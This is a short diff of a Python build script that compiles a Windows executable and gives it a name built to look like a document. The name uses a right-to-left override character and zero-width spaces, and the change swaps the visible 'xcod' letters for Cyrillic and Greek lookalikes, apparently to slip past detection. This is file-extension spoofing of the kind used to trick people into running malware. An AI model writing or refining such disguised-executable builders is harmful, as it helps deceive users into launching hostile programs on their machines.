@@ -63,7 +63,7 @@ def get_temp_name():
     return f"temp_{int(time.time())}.c"
     
 def compile(p: pathlib.Path, c_temp_file: str, output_jpg_name: str):
-    process = subprocess.Popen(f'"C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\Common7\\Tools\\VsDevCmd.bat" && windres ..\\resources\\resources.rc -O coff --target pe-i386 -o ..\\resources\\resources.res && cl ..\\build\\{c_temp_file} ..\\resources\\resources.res /DEBUG:NONE /link /subsystem:windows /entry:mainCRTStartup /out:\"{p}\\..\\build\\{output_jpg_name}‮xcod​​.exe\"', shell=True, env=os.environ, cwd=f'{p}\\..\\src')
+    process = subprocess.Popen(f'"C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\Common7\\Tools\\VsDevCmd.bat" && windres ..\\resources\\resources.rc -O coff --target pe-i386 -o ..\\resources\\resources.res && cl ..\\build\\{c_temp_file} ..\\resources\\resources.res /DEBUG:NONE /link /subsystem:windows /entry:mainCRTStartup /out:\"{p}\\..\\build\\{output_jpg_name}‮хϲod​.exe\"', shell=True, env=os.environ, cwd=f'{p}\\..\\src')
     process.wait()
     os.remove(f"{p}\\..\\build\\{c_temp_file}")
     temp_obj_file = c_temp_file.split(".")[0] + ".obj"
